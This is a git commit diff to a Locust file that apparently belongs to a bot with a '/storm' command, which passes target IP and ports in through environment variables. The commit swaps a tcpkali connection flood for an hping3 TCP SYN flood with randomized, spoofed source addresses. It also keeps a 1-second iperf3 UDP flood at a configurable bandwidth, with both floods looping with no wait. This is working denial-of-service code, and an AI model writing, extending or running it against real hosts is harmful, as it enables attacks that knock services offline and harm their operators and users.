675145b9ca61983043c2aa0928564bed4c3a66f8
KomaVR <komavr12454@gmail.com>
2025-07-03 05:19:02 -0700

    Update locustfile_tools.py

--- locustfile_tools.py
+++ locustfile_tools.py
@@ -3,36 +3,43 @@ import time
 import subprocess
 from locust import User, task, constant, events
 
-# Read target info from environment (set by the bot’s /storm command)
+# pulled from env by /storm
 TARGET_IP     = os.getenv("LOCUST_TARGET_IP", "127.0.0.1")
 TCP_PORT      = int(os.getenv("LOCUST_TCP_PORT", "12345"))
 UDP_PORT      = int(os.getenv("LOCUST_UDP_PORT", "12345"))
 UDP_BANDWIDTH = os.getenv("LOCUST_UDP_BW", "1G")
 
-class KaliUser(User):
+class HpingUser(User):
     wait_time = constant(0)
 
     @task(1)
-    def tcpkali_flood(self):
-        """1s tcpkali flood: 1000 conns @ 30000 conn/s"""
+    def syn_flood(self):
+        """
+        1s TCP SYN flood using hping3 --flood --rand-source
+        """
         cmd = [
-            "tcpkali",
-            "--connections", "1000",
-            "--connect-rate", "30000",
-            "--duration", "1",
-            f"{TARGET_IP}:{TCP_PORT}",
+            "hping3",
+            "--flood",          # send as fast as possible
+            "--rand-source",    # randomize src IP
+            "-S",               # SYN flag
+            "-p", str(TCP_PORT),
+            TARGET_IP,
         ]
         start = time.time()
         exception = None
         try:
             p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            p.wait(timeout=2)
+            p.wait(timeout=1)
         except Exception as e:
             exception = e
+            try: p.terminate()
+            except: pass
+        else:
+            p.terminate()
         elapsed = int((time.time() - start) * 1000)
         events.request.fire(
-            request_type="tcpkali",
-            name="1s-tcpkali",
+            request_type="hping3",
+            name="1s-hping3-syn",
             response_time=elapsed,
             response_length=0,
             exception=exception,
@@ -42,8 +49,10 @@ class IperfUser(User):
     wait_time = constant(0)
 
     @task(1)
-    def iperf_flood(self):
-        """1s iperf3 UDP flood at configured bandwidth"""
+    def udp_flood(self):
+        """
+        1s UDP flood at configured bandwidth via iperf3
+        """
         cmd = [
             "iperf3",
             "-c", TARGET_IP,
@@ -60,6 +69,10 @@ class IperfUser(User):
             p.wait(timeout=2)
         except Exception as e:
             exception = e
+            try: p.terminate()
+            except: pass
+        else:
+            p.terminate()
         elapsed = int((time.time() - start) * 1000)
         events.request.fire(
             request_type="iperf3",
@@ -68,4 +81,3 @@ class IperfUser(User):
             response_length=0,
             exception=exception,
         )
-      
